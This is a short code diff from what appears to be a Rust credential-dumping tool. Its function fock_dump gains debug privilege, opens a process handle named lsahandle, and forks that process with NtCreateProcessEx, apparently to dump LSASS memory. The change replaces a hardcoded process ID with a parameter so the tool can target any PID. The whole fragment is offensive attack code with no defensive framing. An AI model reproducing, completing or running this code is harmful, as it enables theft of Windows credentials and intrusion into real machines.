@@ -155,7 +155,7 @@ pub fn fock_dump(pid:u32,fullpathname:&str) {
     }
     println!("[+]GetDebugPrivilege success");
 unsafe{
-    let lsahandle:HANDLE = OpenProcess(PROCESS_CREATE_PROCESS, 0, 1312);
+    let lsahandle:HANDLE = OpenProcess(PROCESS_CREATE_PROCESS, 0, pid);
     let mut CurrentSnapshotProcess:HANDLE = std::mem::zeroed();
     let mut status = NtCreateProcessEx(&mut CurrentSnapshotProcess,
         PROCESS_ALL_ACCESS,
